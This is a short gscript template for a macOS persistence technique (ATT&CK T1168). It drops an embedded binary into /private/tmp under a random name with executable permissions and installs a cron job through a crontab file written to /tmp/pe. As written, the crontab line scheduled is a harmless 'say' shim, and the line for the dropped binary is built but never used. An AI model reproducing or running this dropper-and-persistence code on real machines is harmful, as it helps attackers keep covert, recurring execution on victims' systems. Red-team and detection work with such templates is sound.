// Example gscript template
// Title: Persistence_osx_cronjob
// Author: Jay Hill
// Purpose: cron job persistence on osx
// Gscript version: 0.1.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1168

//priority:150
//timeout:150
//import:/private/tmp/example.macho

function BeforeDeploy() {
  LogInfo("Start Cron Job on Osx");
  return true; 
}

function Deploy() {  

  // Drop the Sample
  var example = Asset("example.macho");
  var name = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (var i = 0; i < 5; i++)
    name += possible.charAt(Math.floor(Math.random() * possible.length));
  name = "/private/tmp/"+name;
  WriteFile(name, example.fileData, 0755);
  LogInfo("dropped the example binary here: "+name);

  // Shim Command
  var shim_command = 'say "bingo"\r\n';
  var shim_bytes = StringToByteArray("* * * * * "+shim_command);

  // Write the Cron Command
  var cron_bytes = StringToByteArray("* * * * * "+name);
  WriteFile("/tmp/pe", shim_bytes, 0755);
  
  // Issue the Cron Command
  ExecuteCommand("crontab", ["/tmp/pe"]);
  return true;
}

function AfterDeploy() {
  LogInfo("Done Cron Job on Osx");
  return true;
}
